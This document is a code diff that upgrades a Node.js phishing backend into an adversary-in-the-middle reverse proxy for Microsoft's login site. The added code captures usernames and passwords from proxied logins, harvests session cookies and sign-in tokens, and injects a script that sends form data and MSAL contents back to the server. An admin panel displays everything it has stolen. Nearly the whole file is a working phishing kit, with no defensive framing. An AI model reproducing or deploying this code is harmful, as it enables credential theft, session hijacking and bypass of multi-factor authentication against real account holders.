@@ -1,92 +1,227 @@
 const express = require('express');
+const { createProxyMiddleware } = require('http-proxy-middleware');
 const bodyParser = require('body-parser');
-const cors = require('cors');
 const fs = require('fs');
-const path = require('path');
+const zlib = require('zlib');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
-app.use(bodyParser.json({ limit: '10mb' }));
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(cors());
-app.use(express.static('public'));
-
-// Ensure captures file exists
+// Storage
 const CAPTURES_FILE = './captures.json';
-if (!fs.existsSync(CAPTURES_FILE)) {
-    fs.writeFileSync(CAPTURES_FILE, '[]');
+if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, '[]');
+
+// Parse all body types
+app.use(bodyParser.raw({ type: '*/*', limit: '50mb' }));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+
+// Capture function
+function saveCapture(type, data) {
+    const capture = {
+        timestamp: new Date().toISOString(),
+        type: type,
+        ...data
+    };
+    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
+    captures.push(capture);
+    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
+    console.log(`[${type.toUpperCase()}]`, JSON.stringify(data, null, 2));
 }
 
-// Capture endpoint - receives credentials from frontend
-app.post('/api/capture', (req, res) => {
-    const data = {
-        timestamp: new Date().toISOString(),
-        ip: req.headers['x-forwarded-for'] || req.ip,
-        userAgent: req.headers['user-agent'],
-        ...req.body
-    };
+// Proxy to Microsoft with interception
+const proxy = createProxyMiddleware({
+    target: 'https://login.microsoftonline.com',
+    changeOrigin: true,
+    secure: true,
+    ws: true,
+    selfHandleResponse: true, // We handle response manually to capture data
     
-    // Log to console
-    console.log('\n[CAPTURED]', JSON.stringify(data, null, 2));
+    onProxyReq: (proxyReq, req, res) => {
+        // Log the request
+        const data = {
+            method: req.method,
+            url: req.url,
+            headers: req.headers,
+            ip: req.headers['x-forwarded-for'] || req.ip,
+            body: req.body?.toString?.() || req.body
+        };
+        
+        // Check for credentials in POST body
+        if (req.method === 'POST' && req.body) {
+            const bodyStr = req.body.toString ? req.body.toString() : JSON.stringify(req.body);
+            
+            // Common Microsoft credential fields
+            if (bodyStr.includes('login') || bodyStr.includes('passwd') || bodyStr.includes('password')) {
+                try {
+                    const params = new URLSearchParams(bodyStr);
+                    const login = params.get('login') || params.get('email') || params.get('username');
+                    const pass = params.get('passwd') || params.get('password');
+                    
+                    if (login && pass) {
+                        saveCapture('credentials', { login, pass, url: req.url });
+                    }
+                } catch(e) {}
+                
+                // Try JSON format too
+                try {
+                    const json = JSON.parse(bodyStr);
+                    if (json.username && json.password) {
+                        saveCapture('credentials', { 
+                            login: json.username, 
+                            pass: json.password,
+                            url: req.url 
+                        });
+                    }
+                } catch(e) {}
+            }
+        }
+        
+        saveCapture('request', data);
+        
+        // Write body to proxied request if it exists
+        if (req.body && proxyReq.write) {
+            proxyReq.write(req.body);
+        }
+    },
     
-    // Save to file
-    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
-    captures.push(data);
-    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
-    
-    res.json({ status: 'ok' });
+    onProxyRes: (proxyRes, req, res) => {
+        let body = [];
+        
+        // Decompress if needed
+        const encoding = proxyRes.headers['content-encoding'];
+        
+        proxyRes.on('data', chunk => body.push(chunk));
+        proxyRes.on('end', () => {
+            let buffer = Buffer.concat(body);
+            
+            // Decompress
+            if (encoding === 'gzip') {
+                try { buffer = zlib.gunzipSync(buffer); } catch(e) {}
+            } else if (encoding === 'deflate') {
+                try { buffer = zlib.inflateSync(buffer); } catch(e) {}
+            }
+            
+            const bodyStr = buffer.toString();
+            
+            // Capture cookies (session tokens)
+            if (proxyRes.headers['set-cookie']) {
+                saveCapture('session', {
+                    cookies: proxyRes.headers['set-cookie'],
+                    url: req.url
+                });
+            }
+            
+            // Look for tokens in response body
+            if (bodyStr.includes('ESTSAUTH') || bodyStr.includes('SignInToken')) {
+                const tokenMatch = bodyStr.match(/"token":"([^"]+)"/);
+                if (tokenMatch) {
+                    saveCapture('token', { token: tokenMatch[1] });
+                }
+            }
+            
+            // Modify response - inject tracking script
+            const contentType = proxyRes.headers['content-type'] || '';
+            if (contentType.includes('text/html') && bodyStr.includes('</body>')) {
+                const injection = `
+                <script>
+                // Capture form submissions
+                document.addEventListener('submit', function(e) {
+                    var fd = new FormData(e.target);
+                    var data = {};
+                    fd.forEach((v,k) => data[k] = v);
+                    navigator.sendBeacon('/capture-js', JSON.stringify(data));
+                });
+                
+                // Capture any tokens in page
+                if (window.msal) {
+                    fetch('/capture-js', {
+                        method: 'POST',
+                        body: JSON.stringify({type: 'msal', data: window.msal})
+                    });
+                }
+                </script>
+                `;
+                
+                const modified = bodyStr.replace('</body>', injection + '</body>');
+                buffer = Buffer.from(modified);
+                
+                // Re-compress if needed
+                if (encoding === 'gzip') {
+                    buffer = zlib.gzipSync(buffer);
+                } else if (encoding === 'deflate') {
+                    buffer = zlib.deflateSync(buffer);
+                }
+            }
+            
+            // Send response to client
+            res.status(proxyRes.statusCode);
+            Object.keys(proxyRes.headers).forEach(key => {
+                if (key !== 'content-encoding' || !encoding) {
+                    res.setHeader(key, proxyRes.headers[key]);
+                }
+            });
+            if (encoding) res.setHeader('content-encoding', encoding);
+            res.end(buffer);
+        });
+    }
 });
 
-// Admin panel - view captured credentials
+// JS capture endpoint (for injected script)
+app.post('/capture-js', express.json(), (req, res) => {
+    saveCapture('javascript', req.body);
+    res.sendStatus(200);
+});
+
+// Admin panel
 app.get('/admin', (req, res) => {
     const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
-    const html = `
+    res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Admin Panel</title>
+        <title>AiTM Admin</title>
         <style>
-            body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-            .entry { border: 1px solid #333; margin: 10px 0; padding: 10px; background: #222; }
-            .timestamp { color: #888; font-size: 12px; }
-            .credentials { color: #ff6600; font-size: 16px; margin: 5px 0; }
-            pre { white-space: pre-wrap; word-wrap: break-word; }
+            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
+            .cred { background: #1a1a1a; border-left: 3px solid #0f0; padding: 10px; margin: 10px 0; }
+            .token { color: #ff0; word-break: break-all; }
+            pre { overflow-x: auto; }
         </style>
     </head>
     <body>
-        <h1>Captured Sessions (${captures.length})</h1>
-        <button onclick="fetch('/api/clear', {method: 'POST'}).then(()=>location.reload())">Clear All</button>
+        <h1>Captured Sessions: ${captures.length}</h1>
+        <button onclick="fetch('/clear',{method:'POST'}).then(()=>location.reload())">Clear</button>
         <hr>
         ${captures.reverse().map(c => `
-            <div class="entry">
-                <div class="timestamp">${c.timestamp} | IP: ${c.ip}</div>
-                <div class="credentials">
-                    ${c.email ? `Email: ${c.email}<br>` : ''}
-                    ${c.password ? `Pass: ${c.password}<br>` : ''}
-                </div>
+            <div class="cred">
+                <strong>${c.type.toUpperCase()}</strong> - ${c.timestamp}<br>
+                ${c.login ? `<div>User: ${c.login}</div>` : ''}
+                ${c.pass ? `<div>Pass: ${c.pass}</div>` : ''}
+                ${c.cookies ? `<div class="token">Cookies: ${c.cookies.join('; ')}</div>` : ''}
+                ${c.token ? `<div class="token">Token: ${c.token}</div>` : ''}
                 <pre>${JSON.stringify(c, null, 2)}</pre>
             </div>
         `).join('')}
     </body>
-    </html>`;
-    res.send(html);
+    </html>
+    `);
 });
 
-// Clear captures
-app.post('/api/clear', (req, res) => {
+app.post('/clear', (req, res) => {
     fs.writeFileSync(CAPTURES_FILE, '[]');
     res.json({ cleared: true });
 });
 
-// Health check for Render
+// Health check
 app.get('/health', (req, res) => {
-    res.json({ status: 'alive', captures: JSON.parse(fs.readFileSync(CAPTURES_FILE)).length });
+    res.json({ status: 'AiTM active', captures: JSON.parse(fs.readFileSync(CAPTURES_FILE)).length });
 });
 
+// Apply proxy to all routes
+app.use('/', proxy);
+
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log(`Phishing page: http://localhost:${PORT}`);
-    console.log(`Admin panel: http://localhost:${PORT}/admin`);
+    console.log(`AiTM Proxy running on port ${PORT}`);
+    console.log(`Admin: http://localhost:${PORT}/admin`);
+    console.log(`Target: https://login.microsoftonline.com`);
 });
